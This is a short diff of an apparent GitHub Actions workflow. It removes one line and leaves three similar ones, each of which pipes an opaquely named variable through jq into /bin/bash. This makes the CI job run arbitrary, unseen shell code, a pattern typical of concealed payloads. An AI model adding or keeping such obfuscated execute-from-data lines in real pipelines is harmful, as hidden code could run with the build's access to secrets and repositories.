@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$xn1" | jq -r .zkks293 | /bin/bash
           echo $v5863 | jq -r .j211 | /bin/bash
           printf '%s' "$gbs0765" | jq -r .rztg0638 | /bin/bash
-          echo $wy952 | jq -r .nlpn08 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
